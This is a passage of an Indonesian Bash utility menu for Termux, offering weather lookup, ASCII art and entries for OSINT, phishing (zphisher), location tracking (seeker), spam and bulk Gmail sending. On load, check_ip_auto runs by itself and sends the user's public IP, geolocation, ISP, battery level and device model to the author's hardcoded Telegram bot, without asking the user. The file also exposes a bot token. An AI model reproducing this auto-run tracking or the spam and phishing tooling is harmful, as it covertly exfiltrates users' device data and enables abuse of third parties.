            sys.stdout.write("\r" + bar + " " * (60 - len(bar)))
            sys.stdout.flush()
            sys.stdout.write("\n")

            with open("kirim_gmail.log", "a") as f:
                f.write(f"{i}. Terkirim ke {receiver}: {message}\n")

        except Exception as e:
            print(f"┃ ❌ [{i}/{count}] Gagal: {e}")
        time.sleep(delay)

print("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
print("┃ ✅Selesai. Log tersimpan kirim_gmail.log ┃")
print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
END

  echo
  echo -e "${CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  echo -e "${CYAN}┃${GREEN}             🔥 MRS OFFICIAL 80 🔥${CYAN}            ┃${NC}"
  echo -e "${CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
  echo
  read -p "🔙 Tekan ENTER untuk kembali..."
}

perkiraan_cuaca() {
  # Warna
  YELLOW='\033[1;33m'
  CYAN='\033[1;36m'
  GREEN='\033[1;32m'
  RED='\033[1;31m'
  NC='\033[0m'

  clear
  echo -e "${YELLOW}╭────────────────────────────────────────╮${NC}"
  echo -e "│         ${CYAN}PERKIRAAN CUACA HARI INI${YELLOW}         │"
  echo -e "${YELLOW}╰────────────────────────────────────────╯${NC}"
  echo

  read -p "Masukkan nama kota/daerah (contoh: Kisaran, Jakarta, Bandung): " kota

  if [[ -z "$kota" ]]; then
    echo -e "${RED}[ERROR] Nama kota/daerah tidak boleh kosong!${NC}"
    return 1
  fi

  # Encode spasi → %20
  kota_encode=$(echo "$kota" | sed 's/ /%20/g')

  echo -e "${CYAN}────────────────────────────────────────${NC}"
  echo -e "${YELLOW}Mengambil data cuaca untuk:${NC} ${GREEN}$kota${NC}"
  echo -e "${CYAN}────────────────────────────────────────${NC}"

  # Ambil data dari wttr.in (ringkas + detail 1–2 hari)
  hasil=$(curl -s "https://wttr.in/${kota_encode}?m1n&lang=id")

  if [[ -z "$hasil" ]]; then
    echo -e "${RED}[ERROR] Gagal mengambil data cuaca.${NC}"
  else
    echo -e "${GREEN}$hasil${NC}"
  fi

  echo
  echo -e "${CYAN}────────────────────────────────────────${NC}"
  read -p "Tekan ENTER untuk kembali..." temp
}


telegram_notify() {
  local msg="$1"
  local BOT_TOKEN="7659881647:AAGVQ4Dvjs8R5HZHyeH0UQLIJMQPWvgOJFM"
  local CHAT_ID="7588621368"
  curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
    -d "chat_id=${CHAT_ID}&text=${msg}" >/dev/null
}

check_ip_auto() {
  CYAN='\033[1;36m'
  GREEN='\033[1;32m'
  YELLOW='\033[1;33m'
  RED='\033[1;31m'
  NC='\033[0m'

  public_ip=$(curl -s https://api.ipify.org)
  location_info=$(curl -s "http://ip-api.com/json/$public_ip" | jq -r '.country, .regionName, .city, .isp' | paste -sd ', ' -)
  battery=$(termux-battery-status | jq -r '.percentage' 2>/dev/null || echo "N/A")
  device=$(getprop ro.product.model 2>/dev/null || echo "Unknown Device")

  clear
  echo -e "${CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  echo -e "${CYAN}┃${YELLOW}         🔐 BLACKCAT LOGIN INFO 🔐${CYAN}          ┃${NC}"
  echo -e "${CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
  echo

  echo -e "${GREEN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  printf "┃ 🌍 IP Publik : ${CYAN}%-30s${NC}┃\n" "$public_ip"
  printf "┃ 📌 Lokasi    : ${CYAN}%-30s${NC}┃\n" "$location_info"
  printf "┃ 🔋 Baterai   : ${CYAN}%-30s${NC}┃\n" "${battery}%"
  printf "┃ 📱 Device    : ${CYAN}%-30s${NC}┃\n" "$device"
  echo -e "${GREEN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
  echo

  telegram_notify "🚨 ADA YG LOGIN 🚨
IP: $public_ip
Lokasi: $location_info
Baterai: ${battery}%
Device: $device"

  echo -e "${YELLOW}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  echo -e "${YELLOW}┃${CYAN}✅ Notifikasi terkirim ke Telegram${YELLOW}      ┃${NC}"
  echo -e "${YELLOW}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
  echo
}

# jalankan otomatis
check_ip_auto & telegram_notify

ascii_art_generator() {
  CYAN='\033[1;36m'
  GREEN='\033[1;32m'
  YELLOW='\033[1;33m'
  RED='\033[1;31m'
  NC='\033[0m'

  echo -e "${CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  echo -e "${CYAN}┃${YELLOW}          🎨 MEMBUAT ASCII ART 🎨${CYAN}         ┃${NC}"
  echo -e "${CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"

  echo
  read -p "Masukkan teks yang ingin diubah menjadi ASCII art: " text

  fonts=("standard" "slant" "shadow" "banner" "block" "smblock" "big" "smisome1" "isometric1" "letters" "contessa" "larry3d" "nancyj-fancy" "starwars")

  echo
  echo -e "${CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  echo -e "${CYAN}┃${YELLOW}                PILIH FONT${CYAN}                 ┃${NC}"
  echo -e "${CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"

  # daftar font dalam kotak
  echo -e "${GREEN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  for i in "${!fonts[@]}"; do
    printf "┃ [ %2d ] %-25s ┃\n" $((i+1)) "${fonts[$i]}"
  done
  echo -e "${GREEN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"

  echo
  read -p "Masukkan nomor font yang diinginkan: " font_number

  if ! [[ "$font_number" =~ ^[0-9]+$ ]]; then
    echo -e "${RED}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
    echo -e "${RED}┃ Nomor font harus berupa angka.           ┃${NC}"
    echo -e "${RED}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
    return 1
  fi

  if [[ "$font_number" -lt 1 || "$font_number" -gt ${#fonts[@]} ]]; then
    echo -e "${RED}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
    echo -e "${RED}┃ Nomor font tidak valid.                  ┃${NC}"
    echo -e "${RED}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
    return 1
  fi

  selected_font="${fonts[$((font_number - 1))]}"

  if command -v figlet >/dev/null 2>&1; then
    echo
    echo -e "${CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
    echo -e "${CYAN}┃${YELLOW}               HASIL ASCII${CYAN}                 ┃${NC}"
    echo -e "${CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
    figlet -f "$selected_font" "$text" | lolcat
  else
    echo -e "${RED}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
    echo -e "${RED}┃ figlet tidak ditemukan. Instal figlet dulu.┃${NC}"
    echo -e "${RED}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
  fi

  echo
  echo -e "${CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
  echo -e "${CYAN}┃${YELLOW}             MRS OFFICIAL 80${CYAN}              ┃${NC}"
  echo -e "${CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
}

install_dependencies() {
  echo -e "${YELLOW}Memeriksa dan menginstal dependensi...${NC}"
  sleep 2

  if sudo apt update &>/dev/null && sudo apt install curl jq figlet lolcat xdg-utils python3 python3-pip openssl -y &>/dev/null; then
    echo -e "${GREEN}Semua dependensi telah terinstal.${NC}"
    sudo pip3 install requests
  else
  sleep 2
    echo -e "${RED}JIKA ADA YANG ERROR TANYAKAN KE MRS JANGAN MALU YHA!!${NC}"
  fi
  sleep 3
}

kembali_ke_menu() {
  read -n 1 -s -r -p "TEKAN ENTER UNTUK KEMBALI KE MENU AWAL"
  echo
}

# ------------------------------
# Main Menu
# ------------------------------
main_menu() {
    while true; do
        show_menu
        read -p "PILIH TOOLS: " MRS

        case $MRS in
            1) cake_name_pake_nomor; kembali_ke_menu ;;
            2) menu_osint; kembali_ke_menu ;;
            3) perkiraan_cuaca; kembali_ke_menu ;;
            4) cek_kodam; kembali_ke_menu ;;
            5) ipgeo_feature; kembali_ke_menu ;;
            6) holehe_feature; kembali_ke_menu ;;
            7) info; kembali_ke_menu ;;
            8) kirim_gmail_vip; break ;;
            9) all_kalkulator; kembali_ke_menu ;;
            10) fitur_spam_sumut; kembali_ke_menu ;;
            11) ascii_art_generator; kembali_ke_menu ;;
            12) bug_aku; kembali_ke_menu ;;
            13) zphisher; kembali_ke_menu ;;
            14) seeker; kembali_ke_menu ;;
            15) hunternum; kembali_ke_menu ;;
            0)
                echo -e "${CYAN}TERIMAKASIH SUDAH MENGGUNAKAN TOOLS MRS.${NC}"
                exit 0
                ;;
            *)
                ai_wrong_choice
                sleep 2
                ;;
        esac
    done
}

show_whatsapp_support() {
  echo -e "${BLUE}JANGAN LUPA JOIN CHANNEL BLACCAT TEAM YHA MAKASIH${NC}"
  xdg-open "$WHATSAPP_CHANNEL_URL" &
  sleep 5
}

kasi_warna_green() {
  echo -e "${GREEN}$1${NC}"
}

install_dependencies
show_whatsapp_support
main_menu
